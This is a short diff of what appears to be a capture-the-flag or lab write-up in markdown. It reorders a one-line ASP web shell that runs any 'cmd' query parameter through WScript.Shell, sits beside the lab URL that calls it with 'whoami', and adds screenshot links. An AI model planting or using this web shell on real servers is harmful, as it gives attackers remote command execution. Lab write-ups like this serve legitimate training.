@@ -71,11 +71,14 @@ put test.txt
 
 
 ```
-http://10.10.10.116/upload/cmd.asp?cmd=whoami
-```
-```
 <%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
 ```
+```
+http://10.10.10.116/upload/cmd.asp?cmd=whoami
+```
+![image](https://user-images.githubusercontent.com/33616880/232366101-57441e0d-fc94-4fbb-99d5-d55b856e0ad0.png)
+![image](https://user-images.githubusercontent.com/33616880/232366110-7f6082bd-20b8-48b0-a5f1-dadc070b338f.png)
+![image](https://user-images.githubusercontent.com/33616880/232366126-b3fc0a5b-6379-4593-9ff0-68a460f93c88.png)
 
 
 
